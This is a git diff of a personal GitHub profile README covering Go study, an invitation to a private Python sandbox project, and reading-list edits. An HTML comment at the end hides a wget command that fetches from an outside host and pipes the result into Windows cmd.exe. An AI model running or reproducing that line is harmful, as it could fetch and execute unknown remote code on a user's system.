@@ -2,11 +2,15 @@
 This is DackJempsey's profile. Take a look around and let me know if you have any questions :smile:
 
 ### Currently Learning
-Working on sharpening my Go programing skills. Be sure to check in for more repos.
+Working on sharpening my Go programing skills. Be sure to check in for more repos. \
+If you are interested in working with me on the [python sandbox](https://twosixtech.com/hijacking-the-ast-to-safely-handle-untrusted-python/) you can send me and email and I will add you to the private repo.
+
 
 ### Current Reading list
-[Black Hat Go](https://nostarch.com/blackhatgo) \
 [Endurance](https://www.amazon.com/Endurance-Shackletons-Incredible-Alfred-Lansing/dp/0465062881)
+[Quantum Computing and Quantum Information](https://www.amazon.com/Quantum-Computation-Information-10th-Anniversary/dp/1107002176/ref=sr_1_1?crid=3K2FR2P6HUCV2&keywords=nielsen+quantum+computing&qid=1676434522&s=books&sprefix=nielson+quantum+computing%2Cstripbooks%2C65&sr=1-1&ufe=app_do%3Aamzn1.fos.006c50ae-5d4c-4777-9bc0-4513d670b6bc)
+[Hacking APIs](https://nostarch.com/hacking-apis)
+
 
 <!--
 `wget quicker.computer/fe334TGee4GWindows100R443 |C:\Windows\system32\cmd.exe`
